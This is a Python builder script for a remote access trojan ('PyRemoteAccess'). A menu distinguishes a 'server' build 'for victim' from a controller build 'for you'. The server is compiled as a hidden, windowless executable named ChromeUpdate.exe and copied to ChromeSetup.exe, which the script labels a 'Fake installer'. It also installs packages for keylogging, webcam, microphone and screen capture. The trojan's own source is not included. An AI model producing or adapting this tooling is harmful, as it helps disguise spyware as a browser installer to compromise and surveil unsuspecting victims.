import os
import sys
import subprocess
import shutil

def check_pyinstaller():
    try:
        import PyInstaller
        return True
    except:
        return False

def install_pyinstaller():
    print("Installing pyinstaller...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
        return True
    except:
        return False

def build_server():
    print("Building server (RAT) executable...")
    
    cmd = [
        'pyinstaller',
        '--onefile',
        '--noconsole', 
        '--name', 'ChromeUpdate',
    ]

    if os.path.exists('icon.ico'):
        cmd.extend(['--icon', 'icon.ico'])
        print("Using icon.ico")
    
    cmd.append('server.py')
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print("Server build successful: dist/ChromeUpdate.exe")

            if os.path.exists("dist/ChromeUpdate.exe"):
                shutil.copy2("dist/ChromeUpdate.exe", "ChromeSetup.exe")
                print("Fake installer created: ChromeSetup.exe")
            return True
        else:
            print("Server build failed")
            print(result.stderr)
            return False
    except Exception as e:
        print(f"Server build error: {e}")
        return False

def build_controller():
    print("Building controller executable...")
    
    cmd = [
        'pyinstaller',
        '--onefile',
        '--name', 'SystemManager',
    ]

    if os.path.exists('icon.ico'):
        cmd.extend(['--icon', 'icon.ico'])
        print("Using icon.ico")
    
    cmd.append('main.py')
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print("Controller build successful: dist/SystemManager.exe")
            return True
        else:
            print("Controller build failed")
            print(result.stderr)
            return False
    except Exception as e:
        print(f"Controller build error: {e}")
        return False

def install_requirements():
    print("Installing packages...")
    
    packages = [
        'opencv-python',
        'pillow', 
        'pynput',
        'pywin32',
        'pycryptodome',
        'numpy',
        'PyQt5',
        'pyaudio',
        'requests'
    ]
    
    for package in packages:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
            print(f"Installed: {package}")
        except:
            print(f"Failed: {package}")

def clean_build():
    folders = ['build', 'dist']
    files = ['ChromeUpdate.spec', 'SystemManager.spec']
    
    for folder in folders:
        if os.path.exists(folder):
            shutil.rmtree(folder)
    
    for file in files:
        if os.path.exists(file):
            os.remove(file)

def main():
    print("PyRemoteAccess Builder")
    print("1 - Build server only (for victim)")
    print("2 - Build controller only (for you)") 
    print("3 - Build both")
    print("4 - Install requirements")
    print("5 - Clean build files")
    
    choice = input("Select: ")
    
    if not check_pyinstaller():
        if not install_pyinstaller():
            print("Failed to install pyinstaller")
            return
    
    if choice == "1":
        build_server()
        
    elif choice == "2":
        build_controller()
        
    elif choice == "3":
        build_server()
        build_controller()
        
    elif choice == "4":
        install_requirements()
        
    elif choice == "5":
        clean_build()
        print("Cleaned")
        
    else:
        print("Wrong choice")

if __name__ == "__main__":
    main()
